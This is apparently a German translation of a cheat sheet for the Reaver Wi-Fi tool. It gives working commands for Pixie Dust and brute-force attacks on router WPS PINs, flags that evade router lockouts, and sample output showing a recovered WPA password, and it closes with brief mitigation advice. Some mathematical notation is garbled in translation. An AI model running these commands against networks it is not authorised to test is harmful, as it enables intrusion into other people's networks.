<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Reaver-Spickzettel

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) ist ein spezielles Wi-Fi-Sicherheitsüberwachungstool, das entwickelt wurde, um Brute-Force-Angriffe gegen Wi-Fi Protected Setup (WPS)-Registrar-PINs auszuführen. Durch die Wiederherstellung der 8-stelligen WPS-PIN ruft Reaver den Klartext-WPA/WPA2-Pre-Shared-Key (PSK) ab. Es unterstützt auch Offline-Pixie Dust-Angriffe über `pixiewps`.

---

## Inhaltsverzeichnis

- [WPS-Sicherheitslückenmechanik](#wps-vulnerability-mechanics)
- [Installation (`reaver` & `pixiewps`)](#installation-reaver--pixiewps)
- [Reconnaissance: Identifizieren von WPS-Netzwerken (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Pixie Dust Attack (Instant Key Recovery)](#pixie-dust-attack-instant-key-recovery)
- [Vollständige Online-WPS-PIN Brute-Force](#full-online-wps-pin-brute-force)
- [AP-Ratenbegrenzung und Lockout-Handling](#ap-rate-limiting--lockout-handling)
- [Defensive Mitigation](#defensive-mitigation)

---

## WPS-Sicherheitslückenmechanismen

Die WPS-PIN-Authentifizierung verwendet eine 8-stellige PIN, die in zwei Hälften geteilt ist:
- Die erste Hälfte besteht aus 4 Ziffern ($10^4 = 10.000$ Möglichkeiten).
- Die zweite Hälfte besteht aus 3 Ziffern + 1 Prüfsummenziffer ($10^3 = 1.000$ Möglichkeiten).
- Anstatt 10^8 = 100.000.000 $-Kombinationen zu testen, testet ein Angreifer höchstens 10.000 $ + 1.000 = 11.000 $-Versuche.
- **Pixie Dust Attack:** Nutzt schwache PRNG (Pseudozufallszahlengeneratoren) in bestimmten drahtlosen Chipsätzen (Ralink, MediaTek, Realtek, Broadcom), um die WPS-PIN offline in Sekunden aus nur 2 Anfangspaketen zu berechnen.

---

## Installation (`reaver` & `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Aufklärung: Identifizieren von WPS-Netzwerken (`wash`)

Suchen Sie vor dem Starten von Reaver nach Zugangspunkten mit aktiviertem WPS und prüfen Sie, ob sie gesperrt sind:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Zu beachtende Schlüsselspalten:
- **`WPS Locked`**: Bei `Yes` hat der Router WPS-PIN-Versuche aufgrund früherer Brute-Force-Aktivitäten gesperrt. Zielrouter mit `No`.
- **`WPS Ver`**: WPS-Version (1.0 oder 2.0).
- **`ESSID` & `BSSID`**: Zielnetzwerkname und MAC.

---

## Pixie Dust Attack (Sofortige Schlüsselwiederherstellung)

Der Pixie Dust-Angriff (`-K 1`) ist der schnellste Angriff gegen WPS. Es sammelt E-Hash1, E-Hash2 und Nonces vom Router und knackt die PIN offline, ohne Ratenbegrenzungen auszulösen:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Schnittstelle für den Überwachungsmodus.
- `-b <bssid>`: Ziel-Router-MAC.
- `-c 6`: Kanal des Ziel-AP.
- `-K 1`: Automatischen Pixie Dust-Angriff über `pixiewps` ausführen.
- `-vv`: Ausführliche Ausgabe.

*Bei Anfälligkeit werden PIN und WPA-PSK in weniger als 10 Sekunden gedruckt.*

---

## Vollständige Online-WPS-PIN Brute-Force

Wenn Pixie Dust fehlschlägt, greifen Sie auf Online-Brute-Forcing zurück:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Sobald die PIN ermittelt wurde, gibt Reaver Folgendes aus:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## AP-Ratenbegrenzung und Sperrbehandlung

Viele moderne Router sperren WPS-Versuche für 5–15 Minuten nach 3–5 fehlgeschlagenen Versuchen. Verwenden Sie Verzögerungs- und Wiederholungsoptimierungsflags:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Alternative: Verwendung von `bully`
`bully` ist eine schnelle C-Implementierung des WPS-Angriffs, die mit ungewöhnlichen Router-Implementierungen gut zurechtkommt:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Defensive Mitigation

- **WPS vollständig deaktivieren:** Die sicherste Empfehlung ist, WPS in der Weboberfläche des Routers auszuschalten.
- **Firmware aktualisieren:** Moderne Router implementieren eine strikte Ratenbegrenzung, einen exponentiellen Backoff und beheben PRNG-Entropiefehler, die von Pixie Dust ausgenutzt werden.
- **WPA3 verwenden:** WPA3 entfernt das alte PIN-basierte WPS vollständig und ersetzt es durch sicheres Wi-Fi Easy Connect (DPP).